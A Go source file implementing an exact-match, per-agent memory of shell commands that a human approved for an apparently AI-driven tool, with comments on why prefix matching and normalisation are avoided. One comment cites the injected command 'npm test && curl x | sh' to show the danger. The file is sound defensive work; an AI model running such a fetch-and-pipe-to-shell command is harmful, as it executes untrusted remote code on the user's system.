package approvals

import (
	"container/list"
	"strings"
	"sync"
)

// maxRememberedPerAgent caps remembered commands per agent, following the
// shape of internal/permissions.Gate.sessionAllowed.
const maxRememberedPerAgent = 1000

// cmdMemory remembers exact commands a human chose to always allow.
//
// Scope is THIS HUGINN PROCESS. Not the chat session, not the Claude session.
// The UI label must say so.
//
// Matching is byte-exact after trailing-whitespace trim, and nothing else. No
// case folding, no whitespace collapsing, no path canonicalisation. Every
// normalisation step is a place where two different commands collapse into one
// key, and that is the entire attack surface. Prefix matching is deliberately
// absent: "npm test" as a prefix would authorise "npm test && curl x | sh".
type cmdMemory struct {
	mu      sync.Mutex
	max     int
	byAgent map[string]*agentMem
}

type agentMem struct {
	order *list.List               // front = most recently used
	items map[string]*list.Element // key -> element
}

func newCmdMemory(max int) *cmdMemory {
	return &cmdMemory{max: max, byAgent: make(map[string]*agentMem)}
}

// key binds the tool name to the command with a NUL separator so a command
// containing the tool name cannot forge a different tool's key.
func memKey(toolName, command string) string {
	return toolName + "\x00" + strings.TrimRight(command, " \t\r\n")
}

func (m *cmdMemory) has(agentName, toolName, command string) bool {
	m.mu.Lock()
	defer m.mu.Unlock()
	am, ok := m.byAgent[agentName]
	if !ok {
		return false
	}
	el, ok := am.items[memKey(toolName, command)]
	if !ok {
		return false
	}
	am.order.MoveToFront(el)
	return true
}

func (m *cmdMemory) add(agentName, toolName, command string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	am, ok := m.byAgent[agentName]
	if !ok {
		am = &agentMem{order: list.New(), items: make(map[string]*list.Element)}
		m.byAgent[agentName] = am
	}
	k := memKey(toolName, command)
	if el, ok := am.items[k]; ok {
		am.order.MoveToFront(el)
		return
	}
	am.items[k] = am.order.PushFront(k)
	for am.order.Len() > m.max {
		oldest := am.order.Back()
		if oldest == nil {
			break
		}
		am.order.Remove(oldest)
		delete(am.items, oldest.Value.(string))
	}
}
